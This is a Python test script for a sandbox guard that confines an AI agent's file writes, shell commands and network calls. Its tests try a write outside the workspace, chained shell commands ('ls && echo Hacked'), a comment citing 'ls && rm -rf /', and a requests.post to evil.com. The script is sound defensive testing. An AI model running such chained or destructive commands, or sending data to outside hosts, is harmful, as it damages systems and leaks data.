import sys
import os
import subprocess
import shutil
import requests
from pathlib import Path
import builtins

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import src.core as core
from src.core import activate_sentinel, deactivate_sentinel
from src.policy import PolicyEnforcer

activate_sentinel()

print("--- 🛡️ VERIFICATION START ---")

fake_workspace_dir = Path(os.path.abspath("./workspace_fake"))

# TEST 1: The "Fake Workspace" Attack
# Old Vulnerability: allowed_path="./workspace" matched "./workspace_fake"
print("\n[TEST 1] Testing Path Traversal (Fake Workspace)...")
fake_path = fake_workspace_dir / "secret.txt"
try:
    # Ensure directory exists for the test to be valid logic-wise
    os.makedirs(os.path.dirname(str(fake_path)), exist_ok=True)
    with open(str(fake_path), "w") as f:
        f.write("I should not be able to write here.")
    print("❌ FAILED: Agent wrote to fake workspace!")
except Exception as e:
    print(f"✅ PASSED: Blocked write to {fake_path}")
    print(f"   Reason: {e}")

# TEST 2: The "Shell Chaining" Attack
# Old Vulnerability: "ls && rm -rf /" passed because it started with "ls"
print("\n[TEST 2] Testing Shell Injection (&& chaining)...")
try:
    subprocess.run("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: Shell chaining executed!")
except Exception as e:
    print(f"✅ PASSED: Blocked shell chaining.")
    print(f"   Reason: {e}")

# TEST 3: subprocess.Popen interception
print("\n[TEST 3] Testing subprocess.Popen interception...")
try:
    subprocess.Popen("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: subprocess.Popen chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked subprocess.Popen chaining.")
    print(f"   Reason: {e}")

# TEST 4: os.system interception
print("\n[TEST 4] Testing os.system interception...")
try:
    os.system("ls && echo 'Hacked'")
    print("❌ FAILED: os.system chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked os.system chaining.")
    print(f"   Reason: {e}")

# TEST 5: requests.post interception
print("\n[TEST 5] Testing requests.post network interception...")
try:
    requests.post("http://evil.com", json={"x": 1})
    print("❌ FAILED: requests.post to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked requests.post to disallowed host.")
    print(f"   Reason: {e}")

# TEST 6: policy loading should not depend on current working directory
print("\n[TEST 6] Testing CWD-independent policy loading...")
original_cwd = os.getcwd()
try:
    os.chdir(Path(__file__).resolve().parents[2])
    enforcer = PolicyEnforcer()
    if enforcer.policy.get("allowed_paths"):
        print("✅ PASSED: Policy loaded correctly outside sentinel-guard CWD.")
    else:
        print("❌ FAILED: Policy loaded empty outside sentinel-guard CWD.")
finally:
    os.chdir(original_cwd)

# TEST 7: activation idempotency
print("\n[TEST 7] Testing activate_sentinel idempotency...")
before_open = builtins.open
before_run = subprocess.run
before_session_request = requests.sessions.Session.request
activate_sentinel()
after_open = builtins.open
after_run = subprocess.run
after_session_request = requests.sessions.Session.request
if before_open is after_open and before_run is after_run and before_session_request is after_session_request:
    print("✅ PASSED: Repeated activation does not stack/replace patches.")
else:
    print("❌ FAILED: Repeated activation changed patched function references.")

# TEST 8: deactivation restores original runtime behavior
print("\n[TEST 8] Testing deactivate_sentinel restoration...")
deactivate_sentinel()
restored = (
    builtins.open is core._original_open
    and subprocess.run is core._original_run
    and subprocess.Popen is core._original_popen
    and os.system is core._original_os_system
    and requests.sessions.Session.request is core._original_session_request
)
if not restored:
    print("❌ FAILED: Deactivation did not restore all original functions.")
else:
    print("✅ PASSED: Deactivation restored original runtime functions.")
    try:
        # 'pwd' is not whitelisted while sentinel is active; this should run when deactivated.
        subprocess.run("pwd", shell=True, check=True, capture_output=True, text=True)
        print("✅ PASSED: Command execution no longer intercepted after deactivation.")
    except Exception as e:
        print(f"❌ FAILED: Command still appears intercepted after deactivation: {e}")

# Reactivate so script finishes in a protected state for consistency.
activate_sentinel()

# Teardown: cleanup test artifact if it exists.
if fake_workspace_dir.exists() and fake_workspace_dir.is_dir():
    try:
        shutil.rmtree(fake_workspace_dir)
        print(f"\n[TEARDOWN] Removed test artifact: {fake_workspace_dir}")
    except Exception as e:
        print(f"\n[TEARDOWN] Could not remove {fake_workspace_dir}: {e}")

print("\n--- 🛡️ VERIFICATION END ---")
